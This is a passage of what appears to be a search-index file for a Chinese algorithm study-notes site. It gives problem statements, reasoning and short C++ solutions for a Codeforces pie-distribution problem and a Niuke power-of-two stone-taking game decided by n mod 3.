\u518d\u62ff\u8d70\u684c\u5b50\u4e0a\u5269\u4e0b\u7684\u70b8\u9e21\u7684 P_i\\% \u3002 Person i \u6700\u540e\u975e\u5e38\u6b8b\u5fcd\u5730\u4f9d\u6b21\u4ece\u6bcf\u4e2a\u5728\u4ed6\u524d\u9762\u62ff\u70b8\u9e21\u7684\u4eba\u624b\u4e2d\u62ff\u8d70 P_i\\% \u4ed6\u4eec\u624b\u4e2d\u7684\u70b8\u9e21\u3002 \u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e8b\u4e86\u5417\uff1f\u8fd8\u6709\u4e24\u4e2a\u8981\u6c42 \u70b8\u9e21\u5fc5\u987b 100\\% \u5730\u88ab\u5206\u6389 \u5206\u5230\u6700\u591a\u7684\u4eba\u548c\u5206\u5230\u6700\u5c11\u7684\u4eba\u4ed6\u4eec\u624b\u4e2d\u70b8\u9e21\u6bd4\u4f8b\u7684\u5dee\u503c\u8981\u6700\u5c0f \u8f93\u51fa\u7684\u7ed3\u679c\u4e0e\u6807\u51c6\u7b54\u6848\u5dee\u503c\u4e0d\u8d85\u8fc7 10^{-4} \u5373\u4e3a\u6b63\u786e\u3002 \u9898\u89e3 \uff1a \u9996\u5148\u4ece\u70b8\u9e21\u5fc5\u987b 100\\% \u5730\u88ab\u5206\u6389\u8fd9\u4e2a\u6761\u4ef6\u6765\u8003\u8651\u3002\u5982\u679c\u6bcf\u4e2a\u4eba\u9009\u62e9\u7684\u6bd4\u4f8b P_i\\% \\in[0, 1) \uff0c\u90a3\u4e48\u70b8\u9e21\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u5206\u5b8c\uff0c\u6240\u4ee5\u80af\u5b9a\u8981\u6709\u4e00\u4e2a\u4eba\u7684 P_i\\% = 1 \uff0c\u5982\u679c\u8fd9\u4e2a\u4eba\u4e0d\u662f\u7b2c\u4e00\u4e2a\u4eba\uff0c\u5219\u4f1a\u628a\u524d\u9762\u7684\u4eba\u624b\u4e0a\u7684\u70b8\u9e21\u5168\u90e8\u62a2\u8d70\uff0c\u5b9e\u5728\u8fc7\u4e8e\u6b8b\u5fcd\uff0c\u4e5f\u4e0d\u6ee1\u8db3 \u8981\u6c422 \uff0c\u6240\u4ee5\u8ba9\u7b2c\u4e00\u4e2a\u4eba\u5148\u62ff\u8d70\u5168\u90e8\u7684\u70b8\u9e21\u3002 \u518d\u4ece \u8981\u6c422 \u6765\u8003\u8651\uff0c\u5168\u90e8\u5e73\u5206\u7684\u60c5\u51b5\u4e0b\uff0c\u5dee\u503c\u662f\u6700\u5c0f\u7684\uff0c\u90a3\u4e48\u8981\u600e\u4e48\u8fbe\u5230\u5e73\u5206\u7684\u6548\u679c\u5462\uff1f\u6211\u4eec\u5df2\u7ecf\u6709\u4e86 P_1\\% = 1 \uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u60f3\u5230\uff0c\u6700\u540e\u4e00\u4e2a\u4eba\u8981\u4ece\u524d\u9762\u7684\u6240\u6709\u4eba\u624b\u4e0a\u62ff\u70b8\u9e21\uff0c\u90a3\u4e48\u6700\u540e\u4ed6\u624b\u4e0a\u4e00\u5b9a\u4f1a\u6709 P_n\\% \u4e2a\u70b8\u9e21\u3002 \u6709\u4e86\u5bf9\u7b2c\u4e00\u4e2a\u4eba\u548c\u6700\u540e\u4e00\u4e2a\u4eba\u7684\u63a8\u65ad\uff0c\u90a3\u4e48\u8003\u8651\u53ea\u6709 2\u4e2a\u4eba \u7684\u60c5\u51b5\uff0c P_1\\% = 1 \uff0c P_2\\% = 0.5 \uff0c\u70b8\u9e21\u5c31\u88ab\u5e73\u5206\u4e86\u3002 \u518d\u8003\u8651 3\u4e2a\u4eba \u7684\u60c5\u51b5\uff0c3\u4e2a\u4eba\u8981\u5e73\u5206\u7684\u8bdd\uff0c\u6bcf\u4e2a\u4eba 1/3 \uff0c\u4e5f\u5c31\u662f P_3\\% = 1/3 \uff0c\u90a3\u4e48\u5176\u5b9e\u53ea\u8981\u524d\u9762 2\u4e2a\u4eba \u624b\u4e0a \u5404\u6709 0.5 \u53ea\u70b8\u9e21\uff0c\u6700\u540e\u70b8\u9e21\u5c31\u88ab\u5e73\u5206\u4e86\u3002 \u4e8e\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u65ad\uff0c\u7b2c i \u4e2a\u4eba\u7684\u5206\u914d\u6bd4\u4f8b\u4e3a P_i\\% = \\frac{1}{i} \u4fdd\u75595\u4f4d\u5c0f\u6570\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#3","text":"#include <iostream> using namespace std; int main() { int n; cin >> n; for (int i = 1; i <= n; i++) { printf(\"%.5lf\\n\", (1.0 / i) * 100); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/","text":"\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08 # \u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1 1.8. Sample Output 1 1.9. Sample Input 2 1.10. Sample Output 2 1.11. Note 1.12. Source 2. \u9898\u89e3 3. \u4ee3\u7801 \u76ee\u5f55 # 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Title # \u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08 1.2. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.3. Memory Limit # C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.4. Problem Description # \u725b\u725b\u548c\u725b\u59b9\u73a9\u535a\u5f08\u6e38\u620f\u3002 \u725b\u725b\uff1a\u6211\u4eec\u6765\u73a9\u53d6\u77f3\u5b50\u6e38\u620f\u3002\u4e00\u5171\u6709n\u5806\u77f3\u5b50\uff0c\u6bcf\u4e2a\u4eba\u6bcf\u6b21\u53ef\u4ee5\u53d61\u62162\u9897\u77f3\u5b50\uff0c\u8c01\u53d6\u8d70\u4e86\u6700\u540e\u4e00\u9897\u77f3\u5b50\u5c31\u7b97\u8c01\u83b7\u80dc\u3002 \u725b\u59b9\uff1a\u8fd9\u6e38\u620f\u592a\u65e0\u804a\u4e86\u3002 \u725b\u725b\uff1a\u90a3\u6539\u4e00\u6539\u3002\u4e00\u5171\u6709n\u5806\u77f3\u5b50\uff0c\u6bcf\u4e2a\u4eba\u6bcf\u6b21\u53ef\u4ee5\u53d6 1,2,4,8,...2^k \u9897\u77f3\u5b50\uff0c\u8c01\u53d6\u8d70\u4e86\u6700\u540e\u4e00\u9897\u77f3\u5b50\u5c31\u7b97\u8c01\u83b7\u80dc\u3002 \u725b\u59b9\uff1a\u597d\u7684\uff0c\u4f60\u5148\u5f00\u59cb\u53d6\u5427\u3002 \u725b\u725b\u5fc3\u91cc\u77e5\u9053\u81ea\u5df1\u662f\u5426\u6709\u5fc5\u80dc\u7b56\u7565\uff0c\u4f46\u4ed6\u60f3\u6765\u8003\u8003\u4f60\u3002 \u56e0\u4e3a\u725b\u725b\u548c\u725b\u59b9\u5f88\u7231\u73a9\u8fd9\u79cd\u6e38\u620f\uff0c\u6240\u4ee5\u672c\u9898\u6709\u591a\u7ec4\u6570\u636e\u3002 \uff08\u6ce8\uff1a\u725b\u725b\u53eb Alan \uff0c\u725b\u59b9\u53eb Frame .\uff09 1.5. Input # \u7b2c\u4e00\u884c\uff0c\u8f93\u5165\u6570\u636e\u7ec4\u6570T\u3002 \u63a5\u4e0b\u6765T\u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6570n\u3002 1.6. Output # \u5bf9\u4e8e\u6bcf\u4e00\u7ec4\u6570\u636e\uff0c \u5982\u679c\u725b\u725b\u5fc5\u80dc\uff0c\u5219\u8f93\u51fa\u201cAlan\u201d\uff08\u4e0d\u542b\u5f15\u53f7\uff09\uff1b \u5982\u679c\u725b\u59b9\u80dc\uff0c\u5219\u8f93\u51fa\u201cFrame\u201d\uff08\u4e0d\u542b\u5f15\u53f7\uff09\u3002\uff08PS:\u725b\u725b\u53eb Alan \uff0c\u725b\u59b9\u53eb Frame \uff09 1.7. Sample Input 1 # 3 1 2 3 1.8. Sample Output 1 # Alan Alan Frame 1.9. Sample Input 2 # 3 17 18 19 1.10. Sample Output 2 # Alan Frame Alan 1.11. Note # \u6570\u636e\u4fdd\u8bc1 1\\le T\\le 1000,1\\le n\\le 2\\times 10^9 1.12. Source # \u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08 2. \u9898\u89e3 # \u4ece\u76f4\u89c2\u4e0a\u6765\u8bf4\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u628a\u8f93\u5165\u5206\u4e3a 2^x \u548c 2^x + m \u4e24\u79cd\u60c5\u51b5\u6765\u8ba8\u8bba\uff0c\u5982\u679c\u662f 2^x \u5219\u5148\u624b\u76f4\u63a5\u53d6\u5b8c\u4e86\u6240\u6709\u68cb\u5b50\uff0c\u4f46\u662f 2^x + m \u8fd9\u79cd\u60c5\u51b5\u975e\u5e38\u4e0d\u597d\u5224\u65ad\u8c01\u80fd\u83b7\u80dc\u3002 \u4ece\u8f93\u5165\u6837\u4f8b 1 \u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u5982\u679c\u662f n = 3 \uff0c\u90a3\u4e48\u5148\u624b\u53ea\u80fd\u53d6 1 \u6216\u8005 2 \uff0c\u540e\u624b\u80fd\u628a\u5269\u4e0b\u7684\u68cb\u5b50\u53d6\u5b8c\uff0c\u540e\u624b\u4e00\u5b9a\u83b7\u80dc\u3002 \u90a3\u4e48\uff0c\u8981\u540e\u624b\u5fc5\u80dc\uff0c\u5219 n \u9700\u8981\u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6: \u4e0d\u80fd\u662f 2^x \u3002 \u901a\u8fc7\u5076\u6570\u6b21 n := n - 2^k \u8fd0\u7b97 \u4e00\u5b9a\u80fd\u907f\u514d n = 2^x \u3002 \u901a\u8fc7\u5947\u6570\u6b21 n := n - 2^k \u8fd0\u7b97 \u4e00\u5b9a\u80fd\u51cf\u5230 3 \u3002 \u901a\u8fc7\u4e00\u4e9b\u8df3\u8dc3\u6027\u7684\u601d\u7ef4\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u60f3\u5230\u5982\u679c n \\mod 3 = 0 \u5c31\u80fd\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u3002 \u9996\u5148\uff0c\u4e00\u4e2a\u6570\u5982\u679c\u662f3\u7684\u500d\u6570\uff0c\u5219\u4e00\u5b9a\u4e0d\u662f 2^x \uff0c\u6211\u4eec\u53ef\u4ee5\u628a 2^k \\%3 \u7684\u7ed3\u679c\u7f57\u5217\u51fa\u6765\uff0c\u53d1\u73b0\u5448\u73b0 1, 2, 1, 2, ... \u91cd\u590d\u51fa\u73b0\u7684\u89c4\u5f8b\u3002 \u5176\u6b21\uff0c n = 3m \u65f6\uff0c\u7b2c\u4e00\u6b21\u51cf 2^k \u7684\u8fd0\u7b97\uff0c\u4f1a\u8ba9 n \\mod 3 = 1 \u6216 n \\mod 3 = 2 \uff0c\u90a3\u4e48\u5728\u7b2c\u4e8c\u6b21\u51cf 2^k \u7684\u8fd0\u7b97\u7684\u65f6\u5019\uff0c\u53ea\u8981\u53d6 2^k \\mod 3 = n \\mod 3 \uff0c\u5c31\u80fd\u8ba9 n \u53c8\u6210\u4e3a 3 \u7684\u500d\u6570\u3002 \u7531\u6b64\u53c8\u53ef\u4ee5\u63a8\u51fa\uff0c\u5728\u5148\u624b\u4f4d\u4e0a\u51fa\u73b0\u7684\u6570\u5b57\u4e00\u76f4\u6ee1\u8db3 n = 3x \uff0c\u5e76\u4e14 x \u5728\u4e0d\u65ad\u9012\u51cf\uff0c\u6700\u540e\u4e00\u5b9a\u4f1a\u51fa\u73b0 n = 3 \u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981 n \u662f 3 \u7684\u500d\u6570\uff0c\u540e\u624b\u4e00\u5b9a\u83b7\u80dc\uff0c\u8f93\u51fa Frame \u3002 \u53cd\u4e4b\uff0c\u5982\u679c n \u4e0d\u662f 3 \u7684\u500d\u6570\uff0c\u5148\u624b\u53ea\u8981\u53d6 2^k \\mod 3 = n \\mod 3 \uff0c\u628a\u540e\u624b\u4f4d\u4e0a\u51fa\u73b0\u7684\u6570\u5b57\u53d8\u6210 3 \u7684\u500d\u6570\uff0c\u5219\u5148\u624b\u4e00\u5b9a\u83b7\u80dc\uff0c\u8f93\u51fa Alan \u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main(){ int t, n, buffer; double sqrtBuffer; cin>>t; while(t--){ cin>>n; // \u662f3\u7684\u500d\u6570 if(n % 3 == 0){ cout<<\"Frame\"<<endl; }else{ // \u4e0d\u662f3\u7684\u500d\u6570 cout<<\"Alan\"<<endl; } } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#nc205086","text":"\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1 1.8. Sample Output 1 1.9. Sample Input 2 1.10. Sample Output 2 1.11. Note 1.12. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#_1","text":"","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#11-title","text":"\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08","title":"1.1. Title"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#12-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.2. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#13-memory-limit","text":"C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.3. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#14-problem-description","text":"\u725b\u725b\u548c\u725b\u59b9\u73a9\u535a\u5f08\u6e38\u620f\u3002 \u725b\u725b\uff1a\u6211\u4eec\u6765\u73a9\u53d6\u77f3\u5b50\u6e38\u620f\u3002\u4e00\u5171\u6709n\u5806\u77f3\u5b50\uff0c\u6bcf\u4e2a\u4eba\u6bcf\u6b21\u53ef\u4ee5\u53d61\u62162\u9897\u77f3\u5b50\uff0c\u8c01\u53d6\u8d70\u4e86\u6700\u540e\u4e00\u9897\u77f3\u5b50\u5c31\u7b97\u8c01\u83b7\u80dc\u3002 \u725b\u59b9\uff1a\u8fd9\u6e38\u620f\u592a\u65e0\u804a\u4e86\u3002 \u725b\u725b\uff1a\u90a3\u6539\u4e00\u6539\u3002\u4e00\u5171\u6709n\u5806\u77f3\u5b50\uff0c\u6bcf\u4e2a\u4eba\u6bcf\u6b21\u53ef\u4ee5\u53d6 1,2,4,8,...2^k \u9897\u77f3\u5b50\uff0c\u8c01\u53d6\u8d70\u4e86\u6700\u540e\u4e00\u9897\u77f3\u5b50\u5c31\u7b97\u8c01\u83b7\u80dc\u3002 \u725b\u59b9\uff1a\u597d\u7684\uff0c\u4f60\u5148\u5f00\u59cb\u53d6\u5427\u3002 \u725b\u725b\u5fc3\u91cc\u77e5\u9053\u81ea\u5df1\u662f\u5426\u6709\u5fc5\u80dc\u7b56\u7565\uff0c\u4f46\u4ed6\u60f3\u6765\u8003\u8003\u4f60\u3002 \u56e0\u4e3a\u725b\u725b\u548c\u725b\u59b9\u5f88\u7231\u73a9\u8fd9\u79cd\u6e38\u620f\uff0c\u6240\u4ee5\u672c\u9898\u6709\u591a\u7ec4\u6570\u636e\u3002 \uff08\u6ce8\uff1a\u725b\u725b\u53eb Alan \uff0c\u725b\u59b9\u53eb Frame .\uff09","title":"1.4. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#15-input","text":"\u7b2c\u4e00\u884c\uff0c\u8f93\u5165\u6570\u636e\u7ec4\u6570T\u3002 \u63a5\u4e0b\u6765T\u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6570n\u3002","title":"1.5. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#16-output","text":"\u5bf9\u4e8e\u6bcf\u4e00\u7ec4\u6570\u636e\uff0c \u5982\u679c\u725b\u725b\u5fc5\u80dc\uff0c\u5219\u8f93\u51fa\u201cAlan\u201d\uff08\u4e0d\u542b\u5f15\u53f7\uff09\uff1b \u5982\u679c\u725b\u59b9\u80dc\uff0c\u5219\u8f93\u51fa\u201cFrame\u201d\uff08\u4e0d\u542b\u5f15\u53f7\uff09\u3002\uff08PS:\u725b\u725b\u53eb Alan \uff0c\u725b\u59b9\u53eb Frame \uff09","title":"1.6. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#17-sample-input-1","text":"3 1 2 3","title":"1.7. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#18-sample-output-1","text":"Alan Alan Frame","title":"1.8. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#19-sample-input-2","text":"3 17 18 19","title":"1.9. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#110-sample-output-2","text":"Alan Frame Alan","title":"1.10. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#111-note","text":"\u6570\u636e\u4fdd\u8bc1 1\\le T\\le 1000,1\\le n\\le 2\\times 10^9","title":"1.11. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#112-source","text":"\u725b\u5ba2\u7f51 NC205086 \u725b\u725b\u7231\u535a\u5f08","title":"1.12. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#2","text":"\u4ece\u76f4\u89c2\u4e0a\u6765\u8bf4\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u628a\u8f93\u5165\u5206\u4e3a 2^x \u548c 2^x + m \u4e24\u79cd\u60c5\u51b5\u6765\u8ba8\u8bba\uff0c\u5982\u679c\u662f 2^x \u5219\u5148\u624b\u76f4\u63a5\u53d6\u5b8c\u4e86\u6240\u6709\u68cb\u5b50\uff0c\u4f46\u662f 2^x + m \u8fd9\u79cd\u60c5\u51b5\u975e\u5e38\u4e0d\u597d\u5224\u65ad\u8c01\u80fd\u83b7\u80dc\u3002 \u4ece\u8f93\u5165\u6837\u4f8b 1 \u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u5982\u679c\u662f n = 3 \uff0c\u90a3\u4e48\u5148\u624b\u53ea\u80fd\u53d6 1 \u6216\u8005 2 \uff0c\u540e\u624b\u80fd\u628a\u5269\u4e0b\u7684\u68cb\u5b50\u53d6\u5b8c\uff0c\u540e\u624b\u4e00\u5b9a\u83b7\u80dc\u3002 \u90a3\u4e48\uff0c\u8981\u540e\u624b\u5fc5\u80dc\uff0c\u5219 n \u9700\u8981\u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6: \u4e0d\u80fd\u662f 2^x \u3002 \u901a\u8fc7\u5076\u6570\u6b21 n := n - 2^k \u8fd0\u7b97 \u4e00\u5b9a\u80fd\u907f\u514d n = 2^x \u3002 \u901a\u8fc7\u5947\u6570\u6b21 n := n - 2^k \u8fd0\u7b97 \u4e00\u5b9a\u80fd\u51cf\u5230 3 \u3002 \u901a\u8fc7\u4e00\u4e9b\u8df3\u8dc3\u6027\u7684\u601d\u7ef4\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u60f3\u5230\u5982\u679c n \\mod 3 = 0 \u5c31\u80fd\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u3002 \u9996\u5148\uff0c\u4e00\u4e2a\u6570\u5982\u679c\u662f3\u7684\u500d\u6570\uff0c\u5219\u4e00\u5b9a\u4e0d\u662f 2^x \uff0c\u6211\u4eec\u53ef\u4ee5\u628a 2^k \\%3 \u7684\u7ed3\u679c\u7f57\u5217\u51fa\u6765\uff0c\u53d1\u73b0\u5448\u73b0 1, 2, 1, 2, ... \u91cd\u590d\u51fa\u73b0\u7684\u89c4\u5f8b\u3002 \u5176\u6b21\uff0c n = 3m \u65f6\uff0c\u7b2c\u4e00\u6b21\u51cf 2^k \u7684\u8fd0\u7b97\uff0c\u4f1a\u8ba9 n \\mod 3 = 1 \u6216 n \\mod 3 = 2 \uff0c\u90a3\u4e48\u5728\u7b2c\u4e8c\u6b21\u51cf 2^k \u7684\u8fd0\u7b97\u7684\u65f6\u5019\uff0c\u53ea\u8981\u53d6 2^k \\mod 3 = n \\mod 3 \uff0c\u5c31\u80fd\u8ba9 n \u53c8\u6210\u4e3a 3 \u7684\u500d\u6570\u3002 \u7531\u6b64\u53c8\u53ef\u4ee5\u63a8\u51fa\uff0c\u5728\u5148\u624b\u4f4d\u4e0a\u51fa\u73b0\u7684\u6570\u5b57\u4e00\u76f4\u6ee1\u8db3 n = 3x \uff0c\u5e76\u4e14 x \u5728\u4e0d\u65ad\u9012\u51cf\uff0c\u6700\u540e\u4e00\u5b9a\u4f1a\u51fa\u73b0 n = 3 \u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981 n \u662f 3 \u7684\u500d\u6570\uff0c\u540e\u624b\u4e00\u5b9a\u83b7\u80dc\uff0c\u8f93\u51fa Frame \u3002 \u53cd\u4e4b\uff0c\u5982\u679c n \u4e0d\u662f 3 \u7684\u500d\u6570\uff0c\u5148\u624b\u53ea\u8981\u53d6 2^k \\mod 3 = n \\mod 3 \uff0c\u628a\u540e\u624b\u4f4d\u4e0a\u51fa\u73b0\u7684\u6570\u5b57\u53d8\u6210 3 \u7684\u500d\u6570\uff0c\u5219\u5148\u624b\u4e00\u5b9a\u83b7\u80dc\uff0c\u8f93\u51fa Alan \u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205086_%E7%89%9B%E7%89%9B%E7%88%B1%E5%8D%9A%E5%BC%88/#3","text":"#include <iostream> using namespace std; int main(){ int t, 